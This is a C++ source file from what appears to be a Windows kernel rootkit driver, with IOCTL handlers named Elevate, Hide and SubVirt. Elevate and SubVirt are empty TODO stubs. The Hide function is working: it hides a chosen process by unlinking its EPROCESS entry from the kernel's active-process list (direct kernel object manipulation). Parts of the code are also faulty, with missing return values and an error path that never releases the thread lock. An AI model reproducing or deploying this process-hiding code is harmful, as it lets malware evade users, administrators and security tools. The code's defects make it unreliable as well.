#include "ioctl_handles.h"
#include <Ntstrsafe.h>
#include "utils.h"
#include "offsets_n_tokens.h"
#include "sync.h"

static NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret);
static NTSTATUS Elevate(ULONG pid);
static NTSTATUS Hide(ULONG pid);
static NTSTATUS SubVirt();

//
// Calls process elevation function through IOCTL command.
//
NTSTATUS IoctlHandlers::HandleElevate(PIRP pIrp) {

	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid;

	KdPrint(("Recieved Elevate IOCTL...\n"));
	//
	// Retrive PID.
	//
	status = GetIntFromIrp(pIrp, &pid);

	if (!NT_SUCCESS(status)) {
		pIrp->IoStatus.Information = 0;
		return 0;
	}

	KdPrint(("Retrived PID : %d\n", pid));

	status = Elevate(pid);

	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = status;

	return status;
}

//
// Calls process hide function through IOCTL command.
//
NTSTATUS IoctlHandlers::HandleHideProcess(PIRP pIrp) {

	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid;

	KdPrint(("Recieved Hide IOCTL...\n"));
	//
	// Retrive PID.
	//
	status = GetIntFromIrp(pIrp, &pid);

	if (!NT_SUCCESS(status)) {
		pIrp->IoStatus.Information = 0;
		return 0;
	}

	KdPrint(("Retrived PID : %d\n", pid));

	status = Hide(pid);

	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = status;

	return status;

}

//
// Function to test connection between usermode and kernel.
//
NTSTATUS IoctlHandlers::HandleTestConnection(PIRP pIrp, ULONG bufferSize) {

	NTSTATUS status = STATUS_SUCCESS;

	//
	// Get input and output from buffer.
	//
	char* inputbuffer = static_cast<char*>(pIrp->AssociatedIrp.SystemBuffer);
	char* outputbuffer = static_cast<char*>(pIrp->AssociatedIrp.SystemBuffer);
	//
	// Print output recieved from usermode.
	//
	KdPrint(("Input : %s\n", inputbuffer));

	char* outputprefix = "Hello form Kernel! Recieved Input : ";

	//
	// Check if the input buffersize is too small.
	//
	if (bufferSize < (strlen(inputbuffer) + strlen(outputprefix) + 1)) {

		KdPrint(("Output buffer too small...\n"));
		status = STATUS_BUFFER_TOO_SMALL;
		pIrp->IoStatus.Information = 0;
	}

	else {

		char* readbuf = reinterpret_cast<char*>(ExAllocatePool(PagedPool, 1024));

		if (!readbuf) {
			KdPrint(("Buffer allocation failed...\n"));
			status = STATUS_INSUFFICIENT_RESOURCES;
			pIrp->IoStatus.Information = 0;
			pIrp->IoStatus.Status = status;
			return status;
		}

		RtlZeroMemory(readbuf, 1024);
		//
		// Concatnate the strings to a new buffer.
		//
		RtlStringCbCatA(readbuf, bufferSize, outputprefix);
		RtlStringCbCatA(readbuf, bufferSize - strlen(outputprefix) - 1, outputbuffer);
		//
		// Copy buffer to original buffer.
		//
		RtlCopyMemory(outputbuffer, readbuf, strlen(readbuf) + 1);

		ExFreePool(readbuf);

		KdPrint(("Sending to user :%s\n", outputbuffer));
		status = STATUS_SUCCESS;
		pIrp->IoStatus.Information = strlen(outputbuffer) + 1;

	}

	pIrp->IoStatus.Status = status;
	return status;
}
//
// Calls subvirt function through IOCTL command.
// Yet to implement this function.
//
static NTSTATUS IoctlHandlers::HandleSubvirt() {

	KdPrint(("TODO!!!/n"));

	return STATUS_SUCCESS;

}

static NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret) {

	PCHAR pidbuf = static_cast<PCHAR>(pIrp->AssociatedIrp.SystemBuffer);

	KdPrint(("Getting PID...\n"));

	NTSTATUS status = RtlCharToInteger(pidbuf, strlen(pidbuf) + 1, ret);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Sorry! Could not obtain PID from IRP...\n"));
		pIrp->IoStatus.Information = 0;
		return status;
	}

	if (!(*ret)) {
		status = STATUS_INVALID_PARAMETER;
		pIrp->IoStatus.Information = 0;
		return status;
	}

	return status;

}

static NTSTATUS Elevate(ULONG pid) {

	KdPrint(("TODO!!\n"));

}

static NTSTATUS Hide(ULONG pid) {

	DWORD eproc = 0;
	PLIST_ENTRY plist_active_procs;
	//
	// Gain thread exclusivity
	//
	PKDPC pkdpc = Sync::GainAllThreadExclusive();
	
	KdPrint(("Finding EPROC struct with PID...\n"));
	eproc = Utilities::FindProcEproc(pid);

	if (!eproc) {

		KdPrint(("! Error while retriving the eproc structure...\n"));
		return STATUS_INVALID_PARAMETER;
	}
	
	plist_active_procs = (LIST_ENTRY*)(eproc + FLINK_OFFSET);

	// Blink to the reaward process         // change reawards process to point to target process Flink(forward process)
   	*((DWORD*)plist_active_procs->Blink) = (DWORD)plist_active_procs->Flink;

	// Flink to the forward process's Blink(by adding 4 bytes to the PLIST_ENTRY Structure)         // change it to point to the reaward pointer of our target process 
	*((DWORD*)plist_active_procs->Flink + 1) = (DWORD)plist_active_procs->Blink;

	// Proevents Random BSODS
	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Blink);
	//
	// Release all thread exclusivity safely
	//

	Sync::ReleaseAllThreadExclusive(pkdpc);

	KdPrint(("Sucessfully Hid process...\n"));

}
static NTSTATUS SubVirt() {

	KdPrint(("TODO!!\n"));

}
